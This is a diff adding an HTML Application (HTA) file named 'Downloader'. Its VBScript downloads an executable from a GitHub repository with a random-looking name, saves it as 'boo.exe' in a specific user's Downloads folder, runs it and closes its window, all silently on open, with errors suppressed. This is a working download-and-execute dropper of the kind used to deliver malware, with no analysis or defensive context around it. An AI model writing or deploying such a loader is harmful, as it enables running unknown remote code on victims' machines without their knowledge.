@@ -1,0 +1,58 @@
+<html>
+  <head>
+    <title>Downloader</title>
+    <HTA:APPLICATION
+      ID="app"
+      APPLICATIONNAME="Downloader"
+      BORDER="thin"
+      CAPTION="yes"
+      SHOWINTASKBAR="yes"
+      SINGLEINSTANCE="yes"
+    >
+  </head>
+  <body>
+    <script language="VBScript">
+      Option Explicit
+
+      Dim http, stream, fso, shell
+      Dim url, savePath
+
+      url = "https://github.com/Nuthoul/ergetbnerbepkwnef/raw/refs/heads/main/hellworld.exe"
+      savePath = "C:\Users\MOORC22\Downloads\boo.exe"
+
+      On Error Resume Next
+
+      ' Use ServerXMLHTTP for better reliability
+      Set http = CreateObject("MSXML2.ServerXMLHTTP")
+      http.Open "GET", url, False
+      http.Send
+
+      If http.Status = 200 Then
+          Set stream = CreateObject("ADODB.Stream")
+          stream.Type = 1 ' Binary
+          stream.Open
+          stream.Write http.responseBody
+          stream.SaveToFile savePath, 2 ' Overwrite
+          stream.Close
+
+          Set fso = CreateObject("Scripting.FileSystemObject")
+
+          If fso.FileExists(savePath) Then
+              If fso.GetFile(savePath).Size > 0 Then
+                  ' Run the exe
+                  Set shell = CreateObject("WScript.Shell")
+                  shell.Run Chr(34) & savePath & Chr(34), 1, False
+              Else
+                  MsgBox "Downloaded file is empty.", vbCritical, "Error"
+              End If
+          Else
+              MsgBox "File was not saved.", vbCritical, "Error"
+          End If
+      Else
+          MsgBox "Download failed. Status: " & http.Status, vbCritical, "Error"
+      End If
+
+      self.close
+    </script>
+  </body>
+</html>
